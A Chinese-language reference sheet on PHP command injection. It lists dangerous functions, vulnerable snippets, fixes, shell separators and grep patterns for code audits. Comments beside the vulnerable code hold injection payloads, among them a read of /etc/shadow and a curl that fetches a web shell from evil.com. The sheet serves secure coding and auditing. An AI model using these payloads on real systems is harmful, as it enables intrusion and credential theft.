# PHP 命令注入

## 确认条件

用户输入被传入命令执行函数且可控制命令行为。

## 危险函数

```php
system($cmd)           // 执行并直接输出
exec($cmd, $output)    // 执行并返回最后一行
shell_exec($cmd)       // 执行并返回完整输出
passthru($cmd)         // 执行并输出原始结果
popen($cmd, 'r')       // 执行并打开管道
proc_open($cmd, ...)   // 细粒度进程控制
`$cmd`                 // 反引号执行
```

## 检测

```php
// Ping 功能
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
// 127.0.0.1; id

// 文件操作
$file = $_GET['file'];
shell_exec("cat " . $file);
// /etc/passwd; cat /etc/shadow

// 图片处理
$img = $_GET['img'];
exec("convert " . $img . " -resize 100x100 thumb.jpg");
// img.jpg; curl http://evil.com/shell.php -o shell.php

// preg_replace /e (PHP < 7.0)
preg_replace('/.*/e', $_GET['code'], '');
// system('id')

// create_function (PHP < 7.2)
$func = create_function('', $_GET['code']);
// };system('id');//

// assert (PHP < 7.2 支持字符串参数)
assert($_GET['code']);
// system('id')
```

## 修复

```php
// escapeshellarg — 强制引号包裹
system("ping -c 4 " . escapeshellarg($_GET['ip']));

// escapeshellcmd — 转义元字符（较弱）
system(escapeshellcmd("ping -c 4 " . $_GET['ip']));

// 参数分离（最安全）
$descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"]];
$process = proc_open(['ping', '-c', '4', $_GET['ip']], $descriptorspec, $pipes);

// 白名单
$allowed = ['ping', 'traceroute', 'nslookup'];
if (!in_array($_GET['cmd'], $allowed)) die();
```

## 命令分隔符

```
Linux:  ;  |  ||  &  &&  `cmd`  $(cmd)  %0a
Windows: &  &&  |  ||  %0a
```

## 检测命令

```bash
grep -rn "system(\|exec(\|shell_exec(\|passthru(\|popen(\|proc_open(" --include="*.php"
grep -rn "preg_replace.*\/e" --include="*.php"
grep -rn "assert(" --include="*.php"
grep -rn "create_function" --include="*.php"
grep -rn "eval(" --include="*.php"
```
